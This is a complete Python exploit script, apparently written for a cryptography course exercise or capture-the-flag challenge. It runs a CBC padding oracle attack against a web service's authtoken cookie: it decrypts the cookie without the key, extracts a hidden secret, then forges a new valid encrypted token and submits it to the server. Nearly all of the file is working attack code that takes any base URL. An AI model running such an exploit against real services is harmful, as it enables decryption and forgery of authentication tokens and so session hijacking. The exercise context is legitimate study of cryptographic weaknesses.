import requests
from Crypto.Util.Padding import pad
import tqdm
import re
import click


BLOCK_SIZE = 16


class Oracle:
    def __init__(self, base_url: str):
        self.base_url = base_url

    def correct_padding(self, cookie: bytes) -> bool:
        """Ask the oracle if the cookie has correct padding"""
        res = requests.get(
            f"{self.base_url}/quote/", cookies={"authtoken": cookie.hex()}
        ).text
        return "incorrect" not in res

    def get_response(self, cookie: bytes) -> bool:
        """Do the http request and get the body of the response"""
        res = requests.get(
            f"{self.base_url}/quote/", cookies={"authtoken": cookie.hex()}
        )
        return res.text

    def get_new_cookie(self) -> str:
        """Fetch a new unknown atuhtoken to crack"""
        session = requests.Session()
        session.get(self.base_url)
        return session.cookies.get_dict()["authtoken"]


def set_byte(block: bytes, index: int, value: int) -> bytes:
    """Set nth byte from the end"""
    assert value < 256
    assert index < BLOCK_SIZE
    assert len(block) == BLOCK_SIZE
    real_index = BLOCK_SIZE - index - 1
    prefix = block[:real_index]
    postfix = block[real_index + 1 :]
    res = prefix + value.to_bytes() + postfix
    assert len(res) == BLOCK_SIZE
    return res


def get_byte(block: bytes, index: int) -> int:
    """Get nth byte from end"""
    assert index < BLOCK_SIZE
    assert len(block) == BLOCK_SIZE
    real_index = BLOCK_SIZE - index - 1
    return block[real_index]


def xor_blocks(lhs: bytes, rhs: bytes) -> bytes:
    """XOR two blocks together"""
    assert len(lhs) == len(rhs) == BLOCK_SIZE
    res = b"".join(((b1 ^ b2).to_bytes() for b1, b2 in zip(lhs, rhs)))
    assert len(res) == BLOCK_SIZE
    return res


def blockify(text: bytes) -> list[bytes]:
    """Turn text into a list of blocks"""
    assert len(text) % BLOCK_SIZE == 0, "text length must be multiple of blocks size"
    res = [text[i : i + BLOCK_SIZE] for i in range(0, len(text), BLOCK_SIZE)]
    assert all((len(block) == BLOCK_SIZE for block in res))
    return res


def random_block() -> bytes:
    # not actually random as it doesn't make a difference
    # "chosen by fair dice roll. Guaranteed to be random." -xkcd 221
    return bytes.fromhex("cb 56 66 d7 4a 14 a9 d1 94 89 e9 34 4e 7b ca 82")


# followed this tutorial:
# https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/
def crack_block(oracle: Oracle, block: bytes):
    """Padding oracle attack on a single block of ciphertext"""

    assert len(block) == BLOCK_SIZE

    # all block and byte indexes are reversed, they are from the end, this
    # makes it easier to think about since everything has to be done from the
    # back!

    # initial guess of key should be neutral for math reasons
    dec_key = b"\x00" * BLOCK_SIZE
    c2 = block

    # tqdm does progress bars :)
    for byte_offset in tqdm.tqdm(range(BLOCK_SIZE), leave=False, desc="bytes in block"):
        padding = (byte_offset + 1).to_bytes() * BLOCK_SIZE
        c1 = xor_blocks(dec_key, padding)
        for byte_guess in tqdm.tqdm(
            range(256), leave=False, mininterval=0.01, desc="attempt in byte"
        ):
            c1_candidate = set_byte(c1, byte_offset, byte_guess)
            if oracle.correct_padding(c1_candidate + c2):
                if byte_offset == 0:
                    # we might be in an edge case, where the last byte is 0x2
                    # in this case, query should fail if penultimate byte is
                    # set to something else
                    c1_penultimate = get_byte(c1_candidate, 1)
                    c1_penultimate = (c1_penultimate + 1) % 256
                    c1_nudged = set_byte(c1_candidate, 1, c1_penultimate)
                    if not oracle.correct_padding(c1_nudged + c2):
                        continue
                break
        else:
            raise RuntimeError("no valid padding found")
        dec_key = set_byte(dec_key, byte_offset, byte_guess ^ (byte_offset + 1))
    return dec_key


# followed this tutorial:
# https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/
def forward_attack(ct: bytes, oracle: Oracle) -> bytes:
    """Use a padding oracle to decrypt a CBC ciphertext, without knowing the key"""

    print("forward attack...")

    ct_blocks = blockify(ct)
    pt = []

    for ct1, ct2 in tqdm.tqdm(
        zip(ct_blocks[:-1], ct_blocks[1:]), leave=False, desc="blocks in message"
    ):
        dec_key = crack_block(oracle, ct2)
        pt.append(xor_blocks(ct1, dec_key))

    print("DONE!")
    return b"".join(pt)


# followed this tutorial:
# https://www.usenix.org/legacy/event/woot10/tech/full_papers/Rizzo.pdf
def reverse_attack(oracle: Oracle, pt: bytes) -> bytes:
    """Use a padding oracle to encrypt a CBC plaintext, without knowing the key"""

    print("reverse attack...")

    # step 1
    pt_blocks = blockify(pt)
    N = len(pt_blocks)

    # step 2
    ct = [b"\x00" * BLOCK_SIZE] * N
    ct[N - 1] = random_block()

    # step 3
    progress_bar = tqdm.tqdm(total=N, desc="blocks in message", leave=False)
    for i in range(N - 1, 0, -1):
        dec_key = crack_block(oracle, ct[i])
        ct[i - 1] = xor_blocks(pt_blocks[i], dec_key)
        progress_bar.update()

    # step 4
    dec_key = crack_block(oracle, ct[0])
    iv = xor_blocks(pt_blocks[0], dec_key)
    progress_bar.close()

    # step 5
    res = b"".join([iv] + ct)
    assert len(res) == len(pt) + BLOCK_SIZE

    print("DONE!")
    return res


def extract_secret(message: bytes) -> bytes:
    m = re.match(rb'You never figure out that "(?P<secret>[^"]+)"\. :\)', message)
    assert m is not None
    return m.group("secret")


# TODO: read from arg
@click.command
@click.option("-u", "--base-url", required=True, type=str)
def main(base_url):
    oracle = Oracle(base_url)

    cookie = bytes.fromhex(oracle.get_new_cookie())
    print(f"got fresh cookie: {cookie.hex()}")

    plain = forward_attack(cookie, oracle)
    print(f"recovered plaintext: {plain}")

    secret = extract_secret(plain)
    print(f"recovered secret string: {secret}")

    pt_forged = pad(secret + b" plain CBC is not secure!", BLOCK_SIZE)
    print(f"forged message: {pt_forged}")

    ct_forged = reverse_attack(oracle, pt_forged)

    print("server responded:")
    print(oracle.get_response(ct_forged))


if __name__ == "__main__":
    main()
